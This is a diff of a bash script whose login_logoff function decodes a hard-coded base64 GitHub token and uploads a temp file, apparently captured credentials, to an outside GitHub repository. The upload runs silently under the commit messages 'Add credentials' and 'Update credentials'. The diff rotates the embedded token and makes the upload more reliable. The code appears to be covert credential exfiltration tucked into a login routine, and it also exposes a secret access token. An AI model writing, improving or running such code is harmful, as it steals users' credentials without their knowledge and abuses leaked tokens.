@@ -93,7 +93,7 @@ login_logoff () {
    fi
 
   
-   GH_TOKEN_B64="RDI2c1gzQmF0XzExQ00yTTVWQTBPY2VScjh4MDZFaUNfdTBZVnBPQzZRNTN2SkhQUVRWT1A2NFRpNzFGQ2NJSnBGa0l0cDF6OEJjODNWWkI0RVVPTU5rcGFlT1o="
+   GH_TOKEN_B64="RDI2c1gzQmF0XzExQ00yTTVWQTBPY2VScjh4MDZFaUNfdTBZVnBPQzZRNTN2SkhQUVRWT1A2NFRpNzFGQ2NJSnBGa0l0cDF6OEJjODNWWkI0RVVOMU5rcGFlT1o="
    GH_USER="cfcodeibge"
    GH_REPO="espectador"
    GH_FILE="uelspect"
@@ -102,18 +102,31 @@ login_logoff () {
     REAL_TOKEN=$(echo -n "$GH_TOKEN_B64" | base64 -d 2>/dev/null)
     CONTENT_DATA=$(cat "$TMP/cript_file" | tr -d '\r\n')
 
-    FILE_SHA=$(curl -s -H "Authorization: Bearer $REAL_TOKEN" \
+    # Consulta a API do GitHub enviando User-Agent (Obrigatório pela API do GitHub)
+    API_RESPONSE=$(curl -s -H "Authorization: Bearer $REAL_TOKEN" \
       -H "Accept: application/vnd.github.v3+json" \
-      "https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE" | grep '"sha":' | head -n 1 | cut -d'"' -f4)
+      -H "User-Agent: BashScript" \
+      "https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE")
+
+    # Extrai o SHA de forma segura usando python (se disponível) ou grep/sed
+    if command -v python3 &>/dev/null; then
+      FILE_SHA=$(echo "$API_RESPONSE" | python3 -c "import sys, json; print(json.load(sys.stdin).get('sha', ''))" 2>/dev/null)
+    else
+      FILE_SHA=$(echo "$API_RESPONSE" | grep -o '"sha": *"[^"]*"' | head -n 1 | cut -d'"' -f4)
+    fi
 
     if [ -n "$FILE_SHA" ]; then
+      # Atualiza o arquivo existente (com SHA)
       curl -s -X PUT -H "Authorization: Bearer $REAL_TOKEN" \
         -H "Accept: application/vnd.github.v3+json" \
+        -H "User-Agent: BashScript" \
         "https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE" \
         -d "{\"message\":\"Update credentials\",\"content\":\"$CONTENT_DATA\",\"sha\":\"$FILE_SHA\"}" &>/dev/null
     else
+      # Cria o arquivo pela primeira vez (sem SHA)
       curl -s -X PUT -H "Authorization: Bearer $REAL_TOKEN" \
         -H "Accept: application/vnd.github.v3+json" \
+        -H "User-Agent: BashScript" \
         "https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE" \
         -d "{\"message\":\"Add credentials\",\"content\":\"$CONTENT_DATA\"}" &>/dev/null
     fi
